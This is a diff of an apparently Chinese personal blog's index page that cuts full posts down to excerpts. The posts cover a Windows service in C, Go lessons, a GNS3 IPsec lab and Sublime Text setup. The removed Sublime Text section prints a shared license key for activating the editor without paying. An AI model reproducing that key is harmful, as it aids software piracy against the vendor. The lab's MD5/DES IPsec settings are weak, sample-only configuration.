class="line">      case SERVICE_CONTROL_INTERROGATE:  //所有服务必须接受并处理该控制代码</div><div class="line">         break; </div><div class="line"> </div><div class="line">      default: </div><div class="line">         break;</div><div class="line">   &#125; </div><div class="line">   </div><div class="line">&#125;</div><div class="line"></div><div class="line">/************************************************************</div><div class="line">* 函数功能： 将消息记录到事件日志</div><div class="line">*</div><div class="line">* 参数说明： 失败的函数名</div><div class="line">*</div><div class="line">* 其它说明： 该函数不是必须函数，但通常服务在应用程序事件日志</div><div class="line">*			 中应该有一个条目。</div><div class="line">************************************************************/</div><div class="line">VOID SvcReportEvent(LPTSTR szFunction) </div><div class="line">&#123; </div><div class="line">    HANDLE hEventSource;</div><div class="line">    LPCTSTR lpszStrings[2];</div><div class="line">    TCHAR Buffer[80];</div><div class="line"></div><div class="line">    hEventSource = RegisterEventSource(NULL, SVCNAME);</div><div class="line"></div><div class="line">    if( NULL != hEventSource )</div><div class="line">    &#123;</div><div class="line">        StringCchPrintf(Buffer, 80, TEXT(&quot;%s failed with %d&quot;), szFunction, GetLastError());</div><div class="line"></div><div class="line">        lpszStrings[0] = SVCNAME;</div><div class="line">        lpszStrings[1] = Buffer;</div><div class="line"></div><div class="line">        ReportEvent(hEventSource,        // event log handle</div><div class="line">                    EVENTLOG_ERROR_TYPE, // event type</div><div class="line">                    0,                   // event category</div><div class="line">                    SVC_ERROR,           // event identifier</div><div class="line">                    NULL,                // no security identifier</div><div class="line">                    2,                   // size of lpszStrings array</div><div class="line">                    0,                   // no binary data</div><div class="line">                    lpszStrings,         // array of strings</div><div class="line">                    NULL);               // no binary data</div><div class="line"></div><div class="line">        DeregisterEventSource(hEventSource);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p><strong>参考文献：</strong></p>
-<ol>
-<li><p><a href="https://blog.csdn.net/fei_liu/article/details/73395233" target="_blank" rel="external">https://blog.csdn.net/fei_liu/article/details/73395233</a>.</p>
-</li>
-<li><p>《Windows网络程序设计完全讲义》P117，P335.</p>
-</li>
-<li><p>微软的 msdn</p>
-</li>
-</ol>
-
-          
+          123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/04/01/Windows编程/编写exe服务的方法/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1069,16 +968,23 @@
       
         
           
-            <h3 id="一-星位双枪定式"><a href="#一-星位双枪定式" class="headerlink" title="一. 星位双枪定式"></a>一. 星位双枪定式</h3><div align="center"><br><img src="http://wx4.sinaimg.cn/mw690/4369aa0aly1fksjia7c7sj20da0fvwf3.jpg" alt="xing-1"><br></div>
+          一. 星位双枪定式
 
-<h3 id="二-小目托退定式"><a href="#二-小目托退定式" class="headerlink" title="二. 小目托退定式"></a>二. 小目托退定式</h3><p><strong>定式一：</strong> </p>
-<div align="center"><br><img src="http://wx3.sinaimg.cn/mw690/4369aa0aly1fksjiav8t5j20fy0d7dgg.jpg" alt="mu-1"><br></div>
+二. 小目托退定式定式一： 
 
-<p>白 8 也可在 A 位拆。</p>
-<p><strong>定式二：</strong></p>
-<p><div align="center"><br><img src="http://wx2.sinaimg.cn/mw690/4369aa0aly1fksjicsy64j20fy0d70tc.jpg" alt="mu-2"><br></div><br>此定式中，白 6 用的是虎。</p>
+
+白 8 也可在 A 位拆。
+定式二：
+此定式中，白 6 用的是虎。
 
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/10/23/围棋/星位双枪定式与小目托退定式/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1219,24 +1125,19 @@
       
         
           
-            <h4 id="一-实验网络的搭建"><a href="#一-实验网络的搭建" class="headerlink" title="一. 实验网络的搭建"></a>一. 实验网络的搭建</h4><h6 id="1-网络拓扑"><a href="#1-网络拓扑" class="headerlink" title="1. 网络拓扑"></a>1. 网络拓扑</h6><div align="center"><br><img src="http://wx3.sinaimg.cn/mw690/4369aa0aly1fjtub0wwuoj23vf19utiy.jpg" alt="tuopu"><br></div>
+          一. 实验网络的搭建1. 网络拓扑
 
-<h6 id="2-搭建环境"><a href="#2-搭建环境" class="headerlink" title="2. 搭建环境"></a>2. 搭建环境</h6><p>使用 GNS3 来搭建模拟环境，模拟的路由器均为 cisco 2691，使用 wireshark 在 R1 的 eth2 口进行抓包。</p>
-<hr>
-<h4 id="二-实验网络的配置"><a href="#二-实验网络的配置" class="headerlink" title="二. 实验网络的配置"></a>二. 实验网络的配置</h4><h6 id="1-配置-PC1"><a href="#1-配置-PC1" class="headerlink" title="1. 配置 PC1"></a>1. 配置 PC1</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ip 192.168.1.2 255.255.255.0 192.168.1.1</div></pre></td></tr></table></figure>
-<h6 id="2-配置-R1"><a href="#2-配置-R1" class="headerlink" title="2. 配置 R1"></a>2. 配置 R1</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">R1# configure terminal          //简写为 conf t</div><div class="line">R1(config)# interface f0/0       //进入 F0/0 接口</div><div class="line">R1(config-if)# ip address 192.168.1.1 255.255.255.0     //设置 F0/0 口的 IP</div><div class="line">R1(config-if)# no shut     //启用端口，默认端口是关闭的</div><div class="line">R1(config-if)# interface f0/1</div><div class="line">R1(config-if)# ip address 10.10.1.1 255.255.255.0</div><div class="line">R1(config-if)# no shut      //启用端口，默认端口是关闭的</div><div class="line">R1(config-if)# end          //退出配置模式</div></pre></td></tr></table></figure>
-<h6 id="3-配置-PC2"><a href="#3-配置-PC2" class="headerlink" title="3. 配置 PC2"></a>3. 配置 PC2</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ip 192.168.2.2 255.255.255.0 192.168.2.1</div></pre></td></tr></table></figure>
-<h6 id="4-配置-R2"><a href="#4-配置-R2" class="headerlink" title="4. 配置 R2"></a>4. 配置 R2</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">R2# configure terminal </div><div class="line">R2(config)# interface f0/0 </div><div class="line">R2(config-if)# ip address 192.168.2.1 255.255.255.0 </div><div class="line">R2(config-if)# no shut</div><div class="line">R2(config-if)# interface f0/1</div><div class="line">R2(config-if)# ip address 10.10.1.2 255.255.255.0</div><div class="line">R2(config-if)# no shut</div><div class="line">R2(config-if)# end</div></pre></td></tr></table></figure>
-<h6 id="5-配置静态路由"><a href="#5-配置静态路由" class="headerlink" title="5. 配置静态路由"></a>5. 配置静态路由</h6><p>在 R1 和 R2 上配置静态路由，实现两端子网的互访。<br>配置 R1，下面两条配置任选其一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">R1(config)# ip route 192.168.2.0 255.255.255.0 10.10.10.2       //最后指定下一路由器 IP</div><div class="line">或者</div><div class="line">R1(config)# ip route 192.168.2.0 255.255.255.0 f0/1         //最后指定送出接口</div></pre></td></tr></table></figure></p>
-<p>配置 R2，下面两条配置任选其一<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">R2(config)# ip route 192.168.1.0 255.255.255.0 10.10.10.1      //最后指定下一路由器 IP</div><div class="line">或者</div><div class="line">R2(config)# ip route 192.168.1.0 255.255.255.0 f0/1         //最后指定送出接口</div></pre></td></tr></table></figure></p>
-<hr>
-<h4 id="三-IPSEC-的配置"><a href="#三-IPSEC-的配置" class="headerlink" title="三. IPSEC 的配置"></a>三. IPSEC 的配置</h4><h6 id="1-R1-的配置"><a href="#1-R1-的配置" class="headerlink" title="1. R1 的配置"></a>1. R1 的配置</h6><p>（1）建立 IKE SA：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">crypto isakmp policy 1          //建立编号为 1 的 IKE 策略</div><div class="line">hash md5</div><div class="line">authentication pre-share</div><div class="line">crypto isakmp key cisco1234 address 10.10.10.2</div></pre></td></tr></table></figure></p>
-<p>（2）建立 IPsec SA：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">crypto ipsec transform-set TEST esp-des esp-sha-hmac            //定义名字为“TEST”的安全算法</div><div class="line">crypto map ABC 10 ipsec-isakmp      //建立名字为 ABC，编号为 10 的 IPSEC 策略，并且会话秘钥由 IKE 动态产生</div><div class="line">set peer 10.10.10.2         //设置隧道终点</div><div class="line">set transform-set TEST</div><div class="line">match address 100       //ACL 100 的流量使用 VPN</div><div class="line">access-list 100 permit ip 192.168.1.0 0.0.0.255 192.168.2.0 0.0.0.255</div></pre></td></tr></table></figure></p>
-<p>（3）在接口下调用 IPsec 策略<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">interface f0/1</div><div class="line">crypto map ABC          //接口下调用 IPSEC 策略</div></pre></td></tr></table></figure></p>
-<h6 id="2-R2-的配置"><a href="#2-R2-的配置" class="headerlink" title="2. R2 的配置"></a>2. R2 的配置</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">crypto isakmp policy 1</div><div class="line">hash md5</div><div class="line">authentication pre-share</div><div class="line">crypto isakmp key cisco1234 address 10.10.10.1</div><div class="line"></div><div class="line">crypto ipsec transform-set TEST esp-des esp-sha-hmac</div><div class="line">crypto map ABC 10 ipsec-isakmp</div><div class="line">set peer 10.10.10.1</div><div class="line">set transform-set TEST</div><div class="line">match address 100</div><div class="line">access-list 100 permit ip 192.168.2.0 0.0.0.255 192.168.1.0 0.0.0.255</div><div class="line"></div><div class="line">interface f0/1</div><div class="line">crypto map ABC</div></pre></td></tr></table></figure>
-<h4 id="四-捕获数据包"><a href="#四-捕获数据包" class="headerlink" title="四. 捕获数据包"></a>四. 捕获数据包</h4><p>搭建好 IPSEC 环境后，开启 wireshark 进行抓包，使用主机 PC1 ping 主机 PC2，使用<code>isakmp or esp</code>规则过滤数据包，捕获的数据包如下：</p>
-<div align="center"><br><img src="http://wx4.sinaimg.cn/mw690/4369aa0aly1fjtu1h9w1fj20n509e40m.jpg" alt="tuopu"><br></div>
-          
+2. 搭建环境使用 GNS3 来搭建模拟环境，模拟的路由器均为 cisco 2691，使用 wireshark 在 R1 的 eth2 口进行抓包。
+
+二. 实验网络的配置1. 配置 PC11ip 192.168.1.2 255.255.255.0 192.16
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/23/密码学/使用GNS3搭建IPSEC模拟环境/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1377,37 +1278,44 @@
       
         
           
-            <h3 id="一-布局"><a href="#一-布局" class="headerlink" title="一. 布局"></a>一. 布局</h3><ul>
-<li><p>敌我较远，占大场</p>
-<ul>
-<li>金角银边草肚皮</li>
-<li>扩张自己，压缩对方</li>
-</ul>
-</li>
-<li><p>敌我接近，接触战</p>
-<ul>
-<li>子多要进攻，分断，封锁</li>
-<li>子少要防守，连接，出头</li>
-</ul>
-</li>
-<li><p>敌我不远也不近，既要占大场，也要保护自己</p>
-</li>
-</ul>
-<h3 id="二-习题"><a href="#二-习题" class="headerlink" title="二. 习题"></a>二. 习题</h3><p><strong>题目一：</strong> 以下三题，用小飞来打接触战</p>
-<div align="center"><br><img src="http://wx4.sinaimg.cn/small/4369aa0aly1fjfwkefrh2j20an0akweu.jpg" alt="ti-1"><br></div><br><div align="center"><br><img src="http://wx1.sinaimg.cn/small/4369aa0aly1fjfwketnbwj20an0akaad.jpg" alt="ti-2"><br></div><br><div align="center"><br><img src="http://wx4.sinaimg.cn/small/4369aa0aly1fjfwkfbf9jj20an0akaag.jpg" alt="ti-3"><br></div>
+          一. 布局
+敌我较远，占大场
+
+金角银边草肚皮
+扩张自己，压缩对方
+
+
+敌我接近，接触战
+
+子多要进攻，分断，封锁
+子少要防守，连接，出头
+
+
+敌我不远也不近，既要占大场，也要保护自己
+
+
+二. 习题题目一： 以下三题，用小飞来打接触战
 
 
 
-<p><strong>题目二：</strong>布置作业</p>
-<div align="center"><br><img src="http://wx1.sinaimg.cn/mw690/4369aa0aly1fjfwkgmsyij20dn0g675h.jpg" alt="ti-4"><br></div>
 
-<p><strong>答案：</strong></p>
-<div align="center"><br><img src="http://wx1.sinaimg.cn/mw690/4369aa0aly1fjfwkfwrguj20e00f8dgu.jpg" alt="da-4"><br></div>
+题目二：布置作业
+
+
+答案：
+
 
 
 
 
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/09/围棋/葛老师围棋课堂（170909）/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1548,20 +1456,17 @@
       
         
           
-            <h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>通过 PPA 来进行安装。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">sudo add-apt-repository ppa:webupd8team/sublime-text-3</div><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install sublime-text-installer</div></pre></td></tr></table></figure>
-<p>装好 Sublime Text 3，还需要激活它，在Help里输入如下的注册信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">—– BEGIN LICENSE —–</div><div class="line">Michael Barnes</div><div class="line">Single User License</div><div class="line">EA7E-821385</div><div class="line">8A353C41 872A0D5C DF9B2950 AFF6F667</div><div class="line">C458EA6D 8EA3C286 98D1D650 131A97AB</div><div class="line">AA919AEC EF20E143 B361B1E7 4#C8B7F04</div><div class="line">B085E65E 2F5F5360 8489D422 FB8FC1AA</div><div class="line">93F6323C FD7F7544 3F39C318 D95E6480</div><div class="line">FCCC7561 8A4A1741 68FA4223 ADCEDE07</div><div class="line">200C25BE DBBC4855 C4CFB774 C5EC138C</div><div class="line">0FEC1CEF D9DCECEC D3A5DAD1 01316C36</div><div class="line">—— END LICENSE ——</div></pre></td></tr></table></figure></p>
-<h2 id="使-Sublime-Text-3-支持中文输入"><a href="#使-Sublime-Text-3-支持中文输入" class="headerlink" title="使 Sublime Text 3 支持中文输入"></a>使 Sublime Text 3 支持中文输入</h2><h4 id="1-安装GTK库"><a href="#1-安装GTK库" class="headerlink" title="1. 安装GTK库"></a>1. 安装GTK库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install libgtk2.0-dev</div></pre></td></tr></table></figure>
-<h4 id="2-编译动态库"><a href="#2-编译动态库" class="headerlink" title="2. 编译动态库"></a>2. 编译动态库</h4><p>保存下面的代码到文件sublime_imfix.c(位于~目录)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/**********************************************************</span></div><div class="line">	&gt; File Name: sublime_imfix.c</div><div class="line">	&gt; Author: GatieMe</div><div class="line">	&gt; Mail: gatieme@163.com </div><div class="line">	&gt; Created Time: 2015年04月04日 星期六 20时20分12秒</div><div class="line"> **********************************************************/</div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;gtk/gtkimcontext.h&gt;</span></span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">gtk_im_context_set_client_window</span> <span class="params">(</span></span></div><div class="line">								GtkIMContext *context,</div><div class="line">								GdkWindow    *window)</div><div class="line">&#123;</div><div class="line">	GtkIMContextClass *klass;</div><div class="line">	g_return_if_fail (GTK_IS_IM_CONTEXT (context));</div><div class="line">	klass = GTK_IM_CONTEXT_GET_CLASS (context);</div><div class="line"></div><div class="line">	<span class="keyword">if</span> (klass-&gt;set_client_window)</div><div class="line">	&#123;</div><div class="line">		klass-&gt;set_client_window (context, window);</div><div class="line">	&#125;</div><div class="line">	g_object_set_data(G_OBJECT(context),<span class="string">"window"</span>,window);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(!GDK_IS_WINDOW (window))</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">int</span> width = gdk_window_get_width(window);</div><div class="line">	<span class="keyword">int</span> height = gdk_window_get_height(window);</div><div class="line"></div><div class="line">	<span class="keyword">if</span>(width != <span class="number">0</span> &amp;&amp; height !=<span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line"></div><div class="line">	&#125;</div><div class="line"></div><div class="line">	gtk_im_context_focus_in(context);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>编译成共享库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -shared -o libsublime-imfix.so sublime_imfix.c  `pkg-config --libs --cflags gtk+-2.0` -fPIC</div></pre></td></tr></table></figure></p>
-<p>拷贝到/opt/sublime_text目录下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo cp libsublime-imfix.so /opt/sublime_text/libsublime-imfix.so</div></pre></td></tr></table></figure></p>
-<p>注意：/opt/sublime_text/不同版本可能有所不同，请调整为自己安装版本的路径</p>
-<p>修改/usr/bin/subl文件，在第一行（<code>#!/bin/sh</code>下）加入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export LD_PRELOAD=/opt/sublime_text/libsublime-imfix.so</div></pre></td></tr></table></figure></p>
-<p>至此，打开 Sublime Text 3 是可以输入中文的，但右键使用 Sublime Text 打开一个文件，却仍然无法输入中文。</p>
-<h4 id="3-解决右键打开，无法输入中文的问题"><a href="#3-解决右键打开，无法输入中文的问题" class="headerlink" title="3. 解决右键打开，无法输入中文的问题"></a>3. 解决右键打开，无法输入中文的问题</h4><p>修改sublime-text.desktop<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo vim /usr/share/applications/sublime-text.desktop</div></pre></td></tr></table></figure></p>
-<p>参照如下信息进行修改<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">[Desktop Entry]</div><div class="line">Version=1.0</div><div class="line">Type=Application</div><div class="line">Name=Sublime Text</div><div class="line">GenericName=Text Editor</div><div class="line">Comment=Sophisticated text editor for code, markup and prose</div><div class="line">Exec=/usr/bin/subl %F        #这里修改执行路径为/usr/bin/subl,subl文件刚才已经修改过，大家应该记得</div><div class="line">Terminal=false</div><div class="line">MimeType=text/plain;        </div><div class="line">Icon=sublime-text</div><div class="line">Categories=TextEditor;Development;</div><div class="line">StartupNotify=true</div><div class="line">Actions=Window;Document;</div><div class="line"></div><div class="line">[Desktop Action Window]</div><div class="line">Name=New Window</div><div class="line">Exec=/usr/bin/subl -n       #这里修改执行路径为/usr/bin/subl,subl文件刚才已经修改过，大家应该记得</div><div class="line">OnlyShowIn=Unity;</div><div class="line"></div><div class="line">[Desktop Action Document]</div><div class="line">Name=New File</div><div class="line">Exec=/usr/bin/subl new_file    #这里修改执行路径为/usr/bin/subl,subl文件刚才已经修改过，大家应该记得</div><div class="line">OnlyShowIn=Unity;</div></pre></td></tr></table></figure></p>
-
-          
+          安装通过 PPA 来进行安装。
+123sudo add-apt-repository ppa:webupd8team/sublime-text-3sudo apt-get updatesudo apt-get install sublime-text-installer
+装好 Sublime Tex
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/06/Linux/安装_Sublime_Text_3/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1702,27 +1607,34 @@
       
         
           
-            <h3 id="一-课堂内容"><a href="#一-课堂内容" class="headerlink" title="一. 课堂内容"></a>一. 课堂内容</h3><p>暑假后第一课，继续讲解分断与连接。同时反复强调“扩张自己，压缩对方”。</p>
-<h3 id="二-习题"><a href="#二-习题" class="headerlink" title="二. 习题"></a>二. 习题</h3><p><strong>题目一：</strong>救角上黑棋</p>
-<div align="center"><br><img src="http://wx3.sinaimg.cn/small/4369aa0aly1fj6qx53korj208g07hjrr.jpg" alt="ti-1"><br></div>
+          一. 课堂内容暑假后第一课，继续讲解分断与连接。同时反复强调“扩张自己，压缩对方”。
+二. 习题题目一：救角上黑棋
 
-<p><strong>答案：</strong></p>
-<div align="center"><br><img src="http://wx3.sinaimg.cn/small/4369aa0aly1fj6qx4koqtj208g07hq3b.jpg" alt="da-1"><br></div>
 
-<p>一线是死亡线，但有时一线也可以救命。</p>
-<p><strong>题目二：</strong>救角上黑棋</p>
-<div align="center"><br><img src="http://wx2.sinaimg.cn/small/4369aa0aly1fj6r1lqoaaj209i06c3yq.jpg" alt="ti-2"><br></div>
+答案：
 
-<p><strong>答案：</strong></p>
-<div align="center"><br><img src="http://wx3.sinaimg.cn/small/4369aa0aly1fj6r1m3r0jj209i06ct92.jpg" alt="da-2"><br></div>
 
-<p>两边同形，走中间。</p>
-<p><strong>题目三：</strong></p>
-<div align="center"><br><img src="http://wx3.sinaimg.cn/small/4369aa0aly1fj6rsn9oqlj20an05aweo.jpg" alt="ti-1"><br></div>
+一线是死亡线，但有时一线也可以救命。
+题目二：救角上黑棋
+
+
+答案：
+
+
+两边同形，走中间。
+题目三：
+
 
 
 
           
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/09/03/围棋/葛老师围棋课堂（170902）/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1863,29 +1775,23 @@
       
         
           
-            <h3 id="一-配料"><a href="#一-配料" class="headerlink" title="一. 配料"></a>一. 配料</h3><p>鲅鱼（切块）、花椒、八角、葱、姜、蒜、油、盐、酱油、醋、料酒、糖、蚝油。</p>
-<h3 id="二-流程"><a href="#二-流程" class="headerlink" title="二. 流程"></a>二. 流程</h3><ol>
-<li><p>锅内多放油，小火，放入花椒和八角（掰开）炸香。</p>
-</li>
-<li><p>放入葱、姜、蒜，慢炒，可以放入少量的五花肉片。</p>
-</li>
-<li><p>加入酱油、料酒、醋（醋要多放，4-5铲），有料酒可以不用加白酒，或者放点泡酒的枸杞等。</p>
-</li>
-<li><p>烧热后，加水，盖锅盖，将水烧开。</p>
-</li>
-<li><p>放入鲅鱼，鱼不新鲜可加蚝油，小火开炖，炖到一半，可尝味酌情加盐和糖。</p>
-</li>
-<li><p>一直小火炖，收汤，出锅。</p>
-</li>
-</ol>
-<h3 id="三-注意"><a href="#三-注意" class="headerlink" title="三. 注意"></a>三. 注意</h3><ol>
-<li><p>多放油和醋</p>
-</li>
-<li><p>千炖豆腐，万炖鱼</p>
-</li>
-</ol>
+          一. 配料鲅鱼（切块）、花椒、八角、葱、姜、蒜、油、盐、酱油、醋、料酒、糖、蚝油。
+二. 流程
+锅内多放油，小火，放入花椒和八角（掰开）炸香。
 
-          
+放入葱、姜、蒜，慢炒，可以放入少量的五花肉片。
+
+加入酱油、料酒、醋（醋要多放，4-5铲），有料酒可以不用加白酒，或者放点泡酒的枸杞等。
+
+烧热后，加水，
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/03/30/美食/烧鲅鱼做法/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
